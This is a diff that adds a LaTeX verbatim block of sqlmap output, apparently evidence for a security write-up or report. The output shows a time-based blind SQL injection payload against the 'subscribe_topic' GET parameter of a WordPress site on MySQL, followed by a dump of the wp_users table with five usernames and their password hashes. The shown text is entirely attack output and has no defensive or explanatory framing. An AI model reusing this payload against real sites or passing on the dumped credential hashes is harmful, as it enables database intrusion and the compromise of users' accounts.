@@ -1,0 +1,23 @@
+\begin{verbatim}
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subscribe_topic (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: subscribe_topic=1 AND (SELECT 8926 FROM (SELECT(SLEEP(5)))vMRJ)
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: wordpress
+Table: wp_users
+[5 entries]
++------------+------------------------------------+
+| user_login | user_pass                          |
++------------+------------------------------------+
+| john       | $P$B8eBH6QfVODeb/gYCSJRvm9MyRv7xz. |
+| Phoenix    | $P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh/gc. |
+| Jane       | $P$BJCq26vxPmaQtAthFcnyNv1322qxD91 |
+| Jsmith     | $P$BV5kUPHrZfVDDWSkvbt/Fw3Oeozb.G. |
+| Jack       | $P$BzalVhBkVN.6ii8y/nbv3CTLbC0E9e. |
++------------+------------------------------------+
+\end{verbatim}
